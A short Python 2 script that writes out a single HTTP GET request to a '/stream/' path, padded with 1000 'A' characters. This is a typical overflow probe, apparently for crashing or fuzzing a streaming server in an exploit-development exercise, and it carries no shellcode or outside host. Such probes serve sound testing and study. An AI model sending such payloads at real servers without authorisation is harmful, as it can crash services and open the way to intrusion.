#!/usr/bin/python2

import os # for output setting
import sys

# turn off output buffer and set binary mode
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)

prefix = "GET /stream/?"
suffix = " HTTP/1.0\n\n"

pad_length = 1000
pad_char = "A"

payload = prefix + pad_char * pad_length + suffix

sys.stdout.write(payload)
